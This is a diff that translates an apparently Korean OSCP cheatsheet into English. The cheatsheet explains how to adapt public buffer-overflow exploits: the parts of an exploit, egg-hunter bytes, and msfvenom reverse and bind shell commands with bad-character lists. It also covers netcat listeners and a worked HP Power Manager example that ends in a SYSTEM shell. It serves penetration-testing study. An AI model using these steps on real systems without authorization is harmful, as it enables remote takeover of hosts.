@@ -1,68 +1,68 @@
 ---
-title: "버퍼 오버플로 & 익스플로잇 수정 (Buffer Overflows & Exploit Fixing)"
+title: "Buffer Overflows & Exploit Fixing"
 date: 2026-06-20
 weight: 140
 draft: false
 tags: ["oscp", "cheatsheet"]
-summary: "공개 BOF 익스플로잇을 대상 환경에 맞게 수정하는 절차 모음."
+summary: "Procedures for adapting a public BOF exploit to the target environment."
 ---
 
-공개 BOF 익스플로잇을 대상에 맞게 수정하는 절차 모음.
+Procedures for adapting a public BOF exploit to the target.
 
-- 출처: https://heretek.dev/oscp-cheatsheet/buffer-overflows/ (Jean Romero) — 재구성
-- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP
+- Source: https://heretek.dev/oscp-cheatsheet/buffer-overflows/ (Jean Romero) — Reconstructed
+- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP
 
-## 시험 노트
+## Exam Notes
 
-- 2024년 11월부로 BOF 머신이 시험에 나온다는 보장은 없어졌다.
-- 그래도 버퍼 오버플로를 쓰는 공개 익스플로잇을 수정하는 능력은 여전히 필수다. 이 문서는 정확히 그 방법을 다룬다.
+- As of November 2024, there is no longer a guarantee that a BOF machine appears on the exam.
+- Even so, the ability to fix a public exploit that uses a buffer overflow is still required. This document covers exactly that.
 
-## 개요 (The Big Picture)
+## The Big Picture
 
-버퍼 오버플로 익스플로잇은 프로그램 메모리를 덮어써 실행 흐름을 가로챈다. 모든 BOF 익스플로잇은 같은 구조를 갖는다.
+A buffer overflow exploit overwrites program memory to hijack the execution flow. Every BOF exploit has the same structure.
 
 ```text
 [PADDING] + [RETURN ADDRESS] + [NOP SLED] + [SHELLCODE]
 ```
 
-공개 익스플로잇을 수정할 때 우리 일은 대부분 쉘코드만 자기 것으로 교체하는 것이다. 가끔은 다른 OS 버전용으로 RETURN ADDRESS만 갱신하면 된다.
+When fixing a public exploit, our job is mostly just replacing the shellcode with our own. Sometimes you only need to update the RETURN ADDRESS for a different OS version.
 
-## BOF 익스플로잇의 5가지 구성 요소
+## The 5 Components of a BOF Exploit
 
-### 1. PADDING (버퍼를 채운다)
+### 1. PADDING (fills the buffer)
 
 ```python
 "\x41"*256
 ```
 
-- `\x41` = 문자 "A"
-- saved return address에 도달할 때까지 버퍼를 채운다
-- 숫자(256)는 취약 앱마다 다르다 — 익스플로잇 작성자가 찾아둔 값
-- 수정 불필요
+- `\x41` = the character "A"
+- Fills the buffer up to the saved return address
+- The number (256) differs per vulnerable app — a value the exploit author already worked out
+- No changes needed
 
-### 2. RETURN ADDRESS (실행 흐름을 탈취한다)
+### 2. RETURN ADDRESS (hijacks the execution flow)
 
 ```python
 RET = "\xCF\xBC\x08\x76"  # JMP ESP in MSVCP60.dll
 ```
 
-- 스택의 saved return address를 덮어쓴다
-- 앱이 로드한 DLL 안의 `JMP ESP` 명령을 가리킨다
-- ESP는 스택에서 RET 다음에 오는 것, 즉 쉘코드를 가리킨다
-- OS 버전 의존적 (중요) — Windows 버전마다 DLL 주소가 다르다
-- 보통은 수정 불필요 — 익스플로잇이 테스트된 OS와 다른 대상을 공격할 때만 변경
+- Overwrites the saved return address on the stack
+- Points at a `JMP ESP` instruction inside a DLL the app has loaded
+- ESP points at whatever comes after RET on the stack, i.e. the shellcode
+- OS-version dependent (important) — DLL addresses differ per Windows version
+- Usually no changes needed — only change it when attacking a target different from the OS the exploit was tested on
 
-### 3. NOP SLED (착륙 활주로)
+### 3. NOP SLED (landing runway)
 
 ```python
 "\x90"*32
 ```
 
-- `\x90` = NOP 명령 ("아무 것도 하지 않고 다음 명령으로 진행")
-- 활주로 역할 — 점프가 쉘코드 위에 정확히 떨어지지 않아도 NOP을 미끄러져 내려가 내 코드에 도달한다
-- 수정 불필요
+- `\x90` = NOP instruction ("do nothing and move to the next instruction")
+- Acts as a runway — even if the jump does not land exactly on the shellcode, execution slides down the NOPs and reaches your code
+- No changes needed
 
-### 4. EGG HUNTER (선택적 — 쉘코드가 너무 클 때 사용)
+### 4. EGG HUNTER (optional — used when the shellcode is too large)
 
 ```python
 EH = '\x33\xD2\x90\x90\x90\x42\x52\x6a'
@@ -71,60 +71,60 @@ EH += '\xf4\xb8\x6e\x30\x30\x62\x8b\xfa'
 EH += '\xaf\x75\xea\xaf\x75\xe7\xff\xe7'
 ```
 
-- 메모리 전체를 훑어 태그(`n00bn00b`, `w00tw00t` 같은)를 찾는 작은 코드
-- RET 뒤 버퍼 공간이 전체 쉘코드를 담기에 너무 작을 때 사용
-- 실제 쉘코드는 요청의 다른 위치(예: User-Agent 헤더)에 둔다
-- egg hunter가 태그를 찾아 그 뒤의 쉘코드로 점프한다
-- egg hunter 코드 자체는 수정 불필요
-- 태그 유지 필수 (중요) — `"n00bn00b"` 같은 태그를 SHELL 변수 맨 앞에 남긴다
+- Small code that scans all of memory looking for a tag (such as `n00bn00b`, `w00tw00t`)
+- Used when the buffer space after RET is too small to hold the full shellcode
+- The actual shellcode goes somewhere else in the request (e.g. the User-Agent header)
+- The egg hunter finds the tag and jumps to the shellcode after it
+- The egg hunter code itself needs no changes
+- Keeping the tag is required (important) — leave a tag like `"n00bn00b"` at the very start of the SHELL variable
 
-### 5. SHELLCODE (페이로드 — 교체하는 대상)
+### 5. SHELLCODE (the payload — the part you replace)
 
 ```python
 SHELL = "n00bn00b"           # <-- egg hunter tag (keep if egg hunter exists)
 SHELL += "\x33\xc9\x83..."   # <-- machine code that runs after exploit succeeds
 ```
 
-- 실제로 실행되는 코드: reverse shell, bind shell, 명령 실행 등
-- msfvenom으로 생성해서 교체하는 부분 (교체 대상)
+- The code that actually executes: reverse shell, bind shell, command execution, etc.
+- The part generated with msfvenom and replaced (the replacement target)
 
-## msfvenom으로 쉘코드 생성
+## Generating shellcode with msfvenom
 
-### 기본 명령
+### Basic command
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f py -b '<BAD_CHARS>' -v SHELL
 ```
 
-### 플래그 설명
+### Flag reference
 
-- `-p windows/shell_reverse_tcp` — 페이로드: TCP 역방향 Windows 쉘
-- `LHOST=tun0` — 내 IP(공격자) — 쉘이 돌아올 주소
-- `LPORT=4444` — 내 리스닝 포트
-- `-f py` — 출력 형식: Python 변수 (파이썬 익스플로잇에 붙여넣는다)
-- `-b '\x00\x3a...'` — 배제할 bad characters (아래 참조)
-- `-v SHELL` — 출력 변수 이름을 SHELL로 (익스플로잇의 변수 이름과 일치)
+- `-p windows/shell_reverse_tcp` — payload: TCP reverse Windows shell
+- `LHOST=tun0` — my IP (attacker) — where the shell connects back to
+- `LPORT=4444` — my listening port
+- `-f py` — output format: Python variable (paste into a Python exploit)
+- `-b '\x00\x3a...'` — bad characters to exclude (see below)
+- `-v SHELL` — name the output variable SHELL (matches the exploit's variable name)
 
-### Bad Character 찾기
+### Finding bad characters
 
-작성자가 주석에 항상 적어둔다. 찾았으면 그 값을 그대로 `-b` 플래그에 복사한다.
+The author always notes them in a comment. Once you have them, copy the value straight into the `-b` flag.
 
 ```python
 # badchar = "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f..."
 ```
 
-흔한 bad character와 이유:
+Common bad characters and why:
 
-- `\x00` — null byte, C 문자열을 끊는다
-- `\x0a` — newline (`\n`), HTTP 헤더를 깬다
-- `\x0d` — carriage return (`\r`), HTTP 헤더를 깬다
-- `\x20` — space, URL/HTTP 파싱을 깬다
-- `\x2f` — forward slash (`/`), URL을 깬다
-- `\x3f` — question mark (`?`), URL을 깬다
-- `\x25` — percent sign (`%`), URL 인코딩을 깬다
-- bad character 목록이 없을 때의 최소 안전 세트: `-b '\x00'`
+- `\x00` — null byte, terminates C strings
+- `\x0a` — newline (`\n`), breaks HTTP headers
+- `\x0d` — carriage return (`\r`), breaks HTTP headers
+- `\x20` — space, breaks URL/HTTP parsing
+- `\x2f` — forward slash (`/`), breaks URLs
+- `\x3f` — question mark (`?`), breaks URLs
+- `\x25` — percent sign (`%`), breaks URL encoding
+- Minimal safe set when there is no bad character list: `-b '\x00'`
 
-### 대상별 페이로드 옵션
+### Payload options per target
 
 ```bash
 # Windows 32-bit reverse shell (most common for OSCP BOF)
@@ -143,7 +143,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f py -b '<BADCHAR
 msfvenom -p windows/shell_bind_tcp LPORT=4444 -f py -b '<BADCHARS>' -v SHELL
 ```
 
-### 출력 형식 (익스플로잇 언어에 맞춘다)
+### Output formats (match the exploit language)
 
 ```bash
 -f py       # Python: SHELL = "\xeb\x03..."    (for Python exploits)
@@ -153,29 +153,29 @@ msfvenom -p windows/shell_bind_tcp LPORT=4444 -f py -b '<BADCHARS>' -v SHELL
 -f elf      # Standalone Linux binary           (for file upload/transfer)
 ```
 
-## 공개 BOF 익스플로잇 수정 전체 과정
+## Full process for fixing a public BOF exploit
 
-### Step 1 — 익스플로잇을 읽고 핵심 요소를 파악
+### Step 1 — Read the exploit and identify the key elements
 
-- 어떤 PORT를 대상으로 하는가?
-- BAD CHARACTERS는 무엇인가? ("badchar" 주석 확인)
-- 쉘코드가 BIND 쉘인가 REVERSE 쉘인가?
-- 어떤 OS에서 TEST됐는가?
-- EGG HUNTER가 있는가? (n00bn00b, w00tw00t 같은 태그 검색)
-- 쉘코드를 담는 VARIABLE NAME은 무엇인가? (SHELL, shellcode, buf 등)
-- PYTHON 2인가 PYTHON 3인가? (print 괄호 유무로 판별)
+- Which PORT does it target?
+- What are the BAD CHARACTERS? (check the "badchar" comment)
+- Is the shellcode a BIND shell or a REVERSE shell?
+- Which OS was it TESTED on?
+- Is there an EGG HUNTER? (search for tags like n00bn00b, w00tw00t)
+- What is the VARIABLE NAME holding the shellcode? (SHELL, shellcode, buf, etc.)
+- Is it PYTHON 2 or PYTHON 3? (tell by whether print has parentheses)
 
-### Step 2 — 새 쉘코드를 생성
+### Step 2 — Generate new shellcode
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f py -b '<BAD_CHARS>' -v <VARIABLE_NAME>
 ```
 
-### Step 3 — 익스플로잇의 쉘코드를 교체
+### Step 3 — Replace the exploit's shellcode
 
-- 기존 SHELL/shellcode 변수 내용을 삭제한다
-- msfvenom 출력을 붙여넣는다
-- Python 2 익스플로잇이면 (print에 괄호 없음): 모든 줄에서 `b` 접두사를 제거한다
+- Delete the contents of the existing SHELL/shellcode variable
+- Paste the msfvenom output
+- If it is a Python 2 exploit (print without parentheses): remove the `b` prefix from every line
 
 ```python
 # msfvenom gives you (Python 3 format):
@@ -187,7 +187,7 @@ SHELL =  ""
 SHELL += "\xeb\x03\x59..."
 ```
 
-- egg hunter가 있으면: 태그를 SHELL의 첫 줄에 유지한다
+- If there is an egg hunter: keep the tag on the first line of SHELL
 
 ```python
 SHELL = ""
@@ -195,14 +195,14 @@ SHELL += "n00bn00b"          # <-- KEEP THIS if egg hunter exists
 SHELL += "\x33\xc9\x83..."   # <-- your new msfvenom shellcode
 ```
 
-### Step 4 — 그 외 수정할 것을 확인
+### Step 4 — Check what else needs changing
 
-- 하드코딩된 IP? → 대상 IP로 변경
-- 하드코딩된 포트? → 대상 서비스와 일치하는지 확인
-- 하드코딩된 경로? → 대상 애플리케이션과 일치하는지 확인
-- Content-Length 헤더? → 쉘코드 크기가 크게 바뀌었다면 갱신 필요
+- Hardcoded IP? → change it to the target IP
+- Hardcoded port? → check it matches the target service
+- Hardcoded path? → check it matches the target application
+- Content-Length header? → update it if the shellcode size changed significantly
 
-### Step 5 — 리스너를 띄우고 실행
+### Step 5 — Start the listener and run
 
 ```bash
 # Terminal 1: start listener FIRST
@@ -215,68 +215,68 @@ python2 exploit.py $ip        # Python 2 exploit
 python3 exploit.py $ip        # Python 3 exploit
 ```
 
-기억할 것:
+Things to remember:
 
-- Bind shell (구식) → 내가 대상에 접속: `nc $ip 4444`
-- Reverse shell (표준) → 대상이 나에게 접속: `nc -lvnp 4444` (리스너를 먼저)
+- Bind shell (old style) → you connect to the target: `nc $ip 4444`
+- Reverse shell (standard) → the target connects to you: `nc -lvnp 4444` (listener first)
 
-## Bind Shell vs Reverse Shell — 언제 무엇을 쓰나
+## Bind Shell vs Reverse Shell — when to use which
 
-- Reverse shell — 대상이 나에게 역방향으로 연결 — 기본 선택 (95%는 이것)
-- Bind shell — 대상이 포트를 열고 내가 접속 — reverse 실패 시에만 (방화벽이 아웃바운드를 차단)
+- Reverse shell — the target connects back to you — the default choice (95% of the time)
+- Bind shell — the target opens a port and you connect — only when reverse fails (firewall blocks outbound)
 
-항상 reverse shell을 먼저 시도한다. 안 되면 대상이 방화벽으로 아웃바운드를 막는 것일 수 있다 — bind shell로 전환한다.
+Always try a reverse shell first. If it does not work, the target may be blocking outbound traffic with a firewall — switch to a bind shell.
 
-## 문제 해결 — 익스플로잇이 동작하지 않을 때
+## Troubleshooting — when the exploit does not work
 
-쉘을 못 받았을 때:
+When you do not get a shell:
 
-1. Python 2인가 3인가? 익스플로잇의 print 문으로 판별
-2. egg hunter 태그가 있었다면 남겼는가?
-3. LHOST가 맞는가? (`ip a` → tun0 확인)
-4. 익스플로잇을 보내기 전에 리스너가 실행 중이었는가?
-5. Python 2 익스플로잇의 `b` 접두사를 제거했는가?
+1. Is it Python 2 or 3? Tell from the exploit's print statements
+2. If there was an egg hunter tag, did you keep it?
+3. Is LHOST correct? (`ip a` → check tun0)
+4. Was the listener running before you sent the exploit?
+5. Did you remove the `b` prefix for a Python 2 exploit?
 
-Connection refused / 포트가 열리지 않을 때:
+Connection refused / port does not open:
 
-1. 대상 서비스가 기대한 포트에서 실제로 실행 중인가?
-2. 익스플로잇이 서비스를 크래시시켰는가? 일부 BOF 익스플로잇은 한 번만 동작한다 — 박스를 리셋
+1. Is the target service actually running on the expected port?
+2. Did the exploit crash the service? Some BOF exploits only work once — reset the box
 
-쉘코드 생성 실패 / 너무 클 때:
+Shellcode generation fails / too large:
 
-1. 다른 인코더 시도: msfvenom에 `-e x86/shikata_ga_nai` 추가
-2. 더 작은 페이로드 사용: `windows/shell_reverse_tcp`(staged)가 `windows/shell/reverse_tcp`(stageless)보다 작다
-3. 익스플로잇 주석에 크기 제약이 적혀 있는지 확인
+1. Try a different encoder: add `-e x86/shikata_ga_nai` to msfvenom
+2. Use a smaller payload: `windows/shell_reverse_tcp` (staged) is smaller than `windows/shell/reverse_tcp` (stageless)
+3. Check whether the exploit comments mention a size constraint
 
-OS 버전이 다를 때:
+When the OS version differs:
 
-1. RETURN ADDRESS(RET)는 OS 전용이다
-2. 대상 OS가 익스플로잇의 테스트 OS와 다르면 RET 주소가 틀릴 수 있다
-3. searchsploit에서 내 OS를 대상으로 하는 다른 버전의 익스플로잇을 찾는다
-4. OSCP에서는 대부분의 BOF 익스플로잇이 쉘코드 교체만으로 그대로 동작한다
+1. The RETURN ADDRESS (RET) is OS-specific
+2. If the target OS differs from the exploit's test OS, the RET address may be wrong
+3. Look in searchsploit for another version of the exploit targeting your OS
+4. On the OSCP, most BOF exploits work as-is with just a shellcode swap
 
-## 실전 예시 — HP Power Manager (retired HTB box)
+## Real example — HP Power Manager (retired HTB box)
 
-- 서비스 발견: HP Power Manager, 포트 80
-- 익스플로잇 발견: `searchsploit hppower` → `windows/remote/10099.py`
-- 읽고 파악한 것:
+- Service found: HP Power Manager, port 80
+- Exploit found: `searchsploit hppower` → `windows/remote/10099.py`
+- What reading it revealed:
   - bad chars: `\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a`
-  - 기존 쉘코드: 포트 4444 bind shell
-  - egg hunter: 있음 (태그 = `n00bn00b`)
-  - 변수 이름: `SHELL`
-  - Python 버전: Python 2
-- 새 쉘코드 생성:
+  - existing shellcode: bind shell on port 4444
+  - egg hunter: present (tag = `n00bn00b`)
+  - variable name: `SHELL`
+  - Python version: Python 2
+- New shellcode generated:
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f py -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a' -v SHELL
 ```
 
-- 쉘코드 교체:
-  - 기존 SHELL 내용 삭제
-  - 새 msfvenom 출력 붙여넣기
-  - 모든 줄에서 `b` 접두사 제거 (Python 2)
-  - SHELL 맨 앞의 `"n00bn00b"` 태그 유지
-- 실행:
+- Shellcode replaced:
+  - Delete the existing SHELL contents
+  - Paste the new msfvenom output
+  - Remove the `b` prefix from every line (Python 2)
+  - Keep the `"n00bn00b"` tag at the start of SHELL
+- Run:
 
 ```bash
 # Terminal 1:
@@ -286,6 +286,6 @@ nc -lvnp 4444
 python2 10099.py $ip
 ```
 
-결과: SYSTEM 쉘 획득.
+Result: SYSTEM shell obtained.
 
-> 익스플로잇을 읽는다. 쉘코드를 찾는다. bad character를 찾는다. 새 쉘코드를 생성한다. 교체한다. 실행한다. 쉘.
+> Read the exploit. Find the shellcode. Find the bad characters. Generate new shellcode. Replace it. Run it. Shell.
